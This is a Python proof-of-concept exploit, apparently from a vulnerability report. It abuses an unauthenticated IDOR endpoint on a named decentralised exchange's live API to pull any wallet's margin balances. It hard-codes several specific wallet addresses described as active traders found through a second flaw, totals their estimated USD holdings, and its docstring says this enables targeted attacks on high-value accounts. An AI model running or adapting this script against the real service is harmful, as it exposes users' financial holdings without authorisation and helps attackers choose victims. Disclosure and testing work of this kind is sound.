"""
PoC #2: REST API IDOR — Read ANY user's margin portfolio without authentication

VULNERABILITY: GET /api/v2/margin/balances/{address} returns full token balances
for any wallet address. No authentication, no rate limiting.

IMPACT: Complete portfolio exposure for all DEX users. Combined with WS IDOR,
enables targeted attacks against high-value accounts.

USAGE:
    python 02_api_idor_portfolio.py <target_address>
    python 02_api_idor_portfolio.py   # scans known active makers
"""

import json
import sys
import requests

API = "https://api.kuru.io/api/v2"


def get_margin_balances(address: str) -> dict:
    """Fetch any user's margin balances — no auth required."""
    r = requests.get(f"{API}/margin/balances/{address}", timeout=10)
    r.raise_for_status()
    return r.json()


def format_portfolio(address: str):
    data = get_margin_balances(address)
    balances = data.get("data", {}).get("data", [])

    print(f"\n{'='*60}")
    print(f"TARGET: {address}")
    print(f"{'='*60}")

    if not balances:
        print("  No margin balances found.")
        return 0

    total_usd = 0
    for entry in balances:
        token = entry.get("token", {})
        ticker = token.get("ticker", "???")
        decimal = token.get("decimal", 18)
        balance_raw = int(entry.get("balance", "0"))
        balance = balance_raw / (10 ** decimal)

        # Rough USD estimation
        usd = 0
        if ticker in ("USDC", "AUSD", "USDT"):
            usd = balance
        elif ticker == "MON":
            usd = balance * 0.023
        elif ticker in ("WETH", "ETH"):
            usd = balance * 3500
        elif ticker in ("WBTC", "cbBTC", "BTC"):
            usd = balance * 67000
        else:
            usd = balance * 0.01

        total_usd += usd
        if balance > 0:
            print(f"  {ticker:8} {balance:>20,.4f}  (~${usd:,.0f})")

    print(f"  {'─'*40}")
    print(f"  TOTAL PORTFOLIO VALUE: ${total_usd:,.0f}")
    return total_usd


if __name__ == "__main__":
    if len(sys.argv) > 1:
        targets = [sys.argv[1]]
    else:
        # Known active makers discovered via WS IDOR
        targets = [
            "0x2b46C08Ca648e2334A1182D31228A79e2BEC1669",
            "0xd0F8A6422CcdD812f29D8FB75CF5FCd41483BaDc",
            "0x8Cf67893C236963233023B56AC56A185B042866F",
        ]

    print("=" * 60)
    print("KURU.IO API IDOR — MARGIN BALANCE EXTRACTION")
    print("No authentication required.")
    print("=" * 60)

    grand_total = 0
    for target in targets:
        grand_total += format_portfolio(target)

    print(f"\n{'='*60}")
    print(f"TOTAL OBSERVABLE TVL ({len(targets)} wallets): ${grand_total:,.0f}")
    print(f"{'='*60}")
    print(f"\n[!] All data retrieved WITHOUT authentication or authorization.")
